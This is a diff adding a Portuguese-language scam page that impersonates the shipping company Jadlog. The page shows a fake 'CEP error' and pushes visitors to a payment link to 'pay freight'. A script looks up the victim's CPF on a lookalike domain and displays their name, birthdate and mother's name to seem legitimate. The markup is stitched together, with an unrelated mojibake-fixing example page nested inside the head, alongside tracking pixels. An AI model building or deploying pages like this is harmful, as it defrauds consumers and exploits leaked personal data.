@@ -1,0 +1,252 @@
+<!DOCTYPE html><html lang="pt-BR"><head><script>
+<script>
+kwaiq.load('288662522106320');
+kwaiq.page();
+</script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '780950984715966');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=780950984715966&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <script src="js/utm-handler.js" data-token="7c82c281-838e-477f-8570-2edf492cddb7" data-click-id-param="click_id">
+</script>
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <!-- Força compatibilidade em navegadores antigos também -->
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Exemplo - Correção de Acentos</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 24px; line-height: 1.5; color:#111 }
+    .notice { background:#f5f5f5; padding:12px; border-radius:6px; margin-bottom:16px }
+  </style>
+</head>
+<body>
+
+  <div class="notice">
+    Exemplo de texto corretamente codificado (UTF-8):<br>
+    <strong>O envio será em parceria com o Jadlog Transporte</strong>
+  </div>
+
+  <div>
+    Aqui também mostramos um trecho que frequentemente aparece errado no site:<br>
+    <!-- Se no seu HTML estiver garbled, substitua pelo texto correto ou deixe esse script consertar -->
+    <p id="possibly-garbled">O envio serÃ¡ em parceria com o Jadlog Transporte</p>
+  </div>
+
+  <!-- SCRIPT DE CORREÇÃO RÁPIDA (aplica substituições comuns de "mojibake") -->
+  <script>
+    (function fixMojibakeInDocument() {
+      // mapeamento comum - estenda se precisar
+      const map = {
+        'Ã¡':'á','Ã©':'é','Ã­':'í','Ã³':'ó','Ãº':'ú',
+        'Ã£':'ã','Ãµ':'õ','Ã§':'ç',
+        'ÃÃ':'Á','Ã‰':'É','Ã‘':'Ñ',
+        'Ã ': 'à', // alguns casos
+        'Âº': 'º','Âª':'ª','Â':''
+      };
+
+      // Conversão robusta aplicada ao innerHTML (cuidado com HTML complexo)
+      function fixText(s){
+        if(!s || typeof s !== 'string') return s;
+        // aplica várias substituições
+        for(const k in map){
+          s = s.split(k).join(map[k]);
+        }
+        // limpar sequências estranhas remanescentes como "Ã" isolado
+        s = s.replace(/Ã(?=[^a-zA-Z0-9])/g, '');
+        return s;
+      }
+
+      // Aplica apenas em nós de texto (mais seguro) — mas aqui aplicamos em elementos simples
+      try {
+        // exemplo simples: corrigir parágrafo específico
+        const el = document.getElementById('possibly-garbled');
+        if(el) el.innerHTML = fixText(el.innerHTML);
+
+        // opção: aplicar no body inteiro (descomente se quiser aplicar em toda a página)
+        // document.body.innerHTML = fixText(document.body.innerHTML);
+
+      } catch(e){
+        console.warn('Erro ao tentar corrigir acentuação automaticamente:', e);
+      }
+    })();
+  </script>
+
+</body>
+</html>
+
+    <script src="../scripts/utms/latest.js" async="" defer=""></script>
+    
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href="https://play-lh.googleusercontent.com/sm-xI7rDNH7tNqoMynYhVACU6b0yGKQnfb1Ee7JyWV30Ko54UxoLw3X6OCHaCsvjsZlu">
+
+    <link rel="stylesheet" href="css/style.css">
+
+    <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        #buttonClick {
+            background-color: #CB0033;
+            color: white;
+            font-family: "Poppins";
+            padding: 7px 15px 7px 15px !important;
+            text-decoration: none !important;
+            border-radius: 10px !important;
+            border: none !important;
+            font-size: 18px !important;
+            font-weight: 600;
+        }
+
+        #buttonClick:hover {
+            background-color: #7a001e;
+            cursor: pointer;
+        }
+        .img1{
+            width: 45%;
+            height: 100%;
+        }
+    </style>
+
+
+    <title>VERIFICAÇÃO</title>
+</head>
+
+<body>
+    <header>
+        <img class="img1" src="images/jadlog-logo.png" alt="">
+
+        <p style="margin-top: 5px; font-size: 12px;">Será responsável pelo envio do pedido.</p>
+    </header>
+
+    <div class="cta">
+        <img id="imagem" src="images/certo-jadlog.png" alt="">
+
+        <p>Confirme os dados de envio seu pedido:</p>
+    </div>
+
+    <div class="cta3">
+        <p id="setar">CONFIRME ABAIXO.</p>
+
+        <p style="padding: 2px;" id="setars">
+            O envio será em parceria com o Jadlog Transporte
+            
+        </p>
+    </div>
+
+    <div class="cta4">
+        <span id="sends">CONFIRMAR</span>
+    </div>
+
+    <div id="popoup">
+        <div class="popoupcontent">
+            <div class="row">
+                <img id="naomostrardeinicio" src="images/red-hazard-warning-sign-on-transparent-background-free-png.png" alt="">
+
+                <div class="headlineectapopoup">
+                    <h1 id="carregandodadoss">Confirmando seus dados...</h1>
+                    <p id="esconderdepois">Por favor aguarde</p>
+                </div>
+
+                <h1 id="carregandodadosSs">ERRO NO CEP</h1>
+            </div>
+
+            <div class="loading">
+                <br>
+                <div class="progresseBar">
+                    <div class="progress"></div>
+                </div>
+            </div>
+
+            <div class="contente">
+                <p>
+                    O valor do CEP foi calculado errado para sua região, o envio não será enviado.
+
+                    <br><br>
+
+                    Para realizarmos o envio é necessário que envie o pagamento do frete. (O Valor pago do frete será reembolsado.)
+                </p>
+
+                <a id="buttonClick" href="https://go.ironpayapp.com.br/yihngrv7cc">
+                    PAGAR FRETE
+                </a>
+
+                <span id="maisforte">Clique no botão para continuar</span>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <img src="images/jadlog-logo.png" alt="">
+
+        <p>Todo conteúdo deste site está publicado sob a licença</p>
+    </footer>
+
+    <script src="js/text.js"></script>
+
+    <script>
+        const queryParams = new URLSearchParams(window.location.search);
+
+        const cpf = queryParams.get('document');
+
+        const user = {};
+
+        function renderData() {
+            if (user.sex && user.birthdate) {
+                let htmlContent = `
+                    Nome: <b>${user.name}</b><br>
+                    Sexo: <b>${user.sex === 'M' ? 'Masculino' : user.sex === 'F' ? 'Feminino' : user.sex}</b><br>
+                    Data de nascimento: <b>${user.birthdate}</b>`;
+
+                if (user.mother && user.mother !== "0") {
+                    htmlContent += `
+                        <br>Nome da mãe: <b>${user.mother}</b>
+                    `;
+                }
+
+                document.getElementById('setar').innerHTML = htmlContent;
+            } else {
+                document.getElementById('setar').innerHTML = `Carregando...`;
+            }
+        }
+
+        fetch('https://g1-noticia.net/verificacao/getUserData.php?cpf=' + cpf)
+            .then(response => response.json())
+            .then(data => {
+                user.name = data.name;
+                user.sex = data.sex;
+                user.cpf = data.cpf;
+                user.mother = data.mother;
+                user.birthdate = data.birthdate;
+
+                renderData();
+            })
+            .catch(error => {
+                console.error('Erro ao fazer a solicitação:', error);
+            });
+    </script>
+
+
+
+
+</body></html>
